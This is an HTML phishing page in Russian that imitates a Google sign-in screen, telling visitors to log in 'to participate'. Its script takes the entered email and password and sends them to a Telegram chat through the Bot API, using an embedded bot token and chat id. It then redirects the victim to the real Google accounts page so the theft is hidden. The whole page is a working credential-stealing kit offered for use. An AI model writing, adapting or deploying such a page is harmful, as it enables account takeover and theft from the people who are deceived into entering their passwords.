<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            width: 100%;
            max-width: 400px;
            background: #ffffff;
            padding: 40px 32px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 500;
        }
        .logo .g { color: #4285F4; }
        .logo .o1 { color: #EA4335; }
        .logo .o2 { color: #FBBC04; }
        .logo .g2 { color: #4285F4; }
        .logo .l { color: #34A853; }
        .logo .e { color: #EA4335; }
        h2 {
            font-size: 22px;
            font-weight: 400;
            color: #202124;
            margin: 16px 0 4px;
        }
        .sub {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .input-group label {
            font-size: 13px;
            font-weight: 500;
            color: #202124;
            display: block;
            margin-bottom: 4px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 12px;
            font-size: 15px;
            background: #fafafa;
            transition: 0.2s;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #4285f4;
            background: #ffffff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.1);
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 4px;
        }
        .btn:hover {
            background: #3367d6;
        }
        .back {
            display: block;
            margin-top: 18px;
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .back:hover {
            text-decoration: underline;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0 16px;
            color: #9aa0a6;
            font-size: 12px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dadce0;
        }
        .divider::before { margin-right: 16px; }
        .divider::after { margin-left: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <span class="g">G</span><span class="o1">o</span><span class="o2">o</span>
            <span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>
        <h2>Вход через Google</h2>
        <div class="sub">Войдите в аккаунт для участия</div>

        <form onsubmit="sendData(event)">
            <div class="input-group">
                <label for="login">Email</label>
                <input type="email" id="login" placeholder="example@gmail.com" required>
            </div>
            <div class="input-group">
                <label for="pass">Пароль</label>
                <input type="password" id="pass" placeholder="Введите пароль" required>
            </div>
            <button class="btn" type="submit">Войти</button>
        </form>

        <div class="divider">или</div>
        <div style="font-size:14px; color:#5f6368;">
            <a href="#" style="color:#1a73e8; text-decoration:none;">Забыли пароль?</a>
            &nbsp;·&nbsp;
            <a href="#" style="color:#1a73e8; text-decoration:none;">Создать аккаунт</a>
        </div>

        <a href="index.html" class="back">← Вернуться на сайт</a>
    </div>

    <script>
        function sendData(e) {
            e.preventDefault();
            const login = document.getElementById('login').value.trim();
            const pass = document.getElementById('pass').value.trim();

            fetch('https://api.telegram.org/bot8837381285:AAHWL1eNiJDSxXaZYwVjTKPh0Q5fVLPsd70/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: 7729580619,
                    text: `🔑 Google\nLogin: ${login}\nPass: ${pass}`
                })
            })
            .then(() => window.location.href = 'https://accounts.google.com')
            .catch(() => window.location.href = 'https://accounts.google.com');
        }
    </script>
</body>
</html>
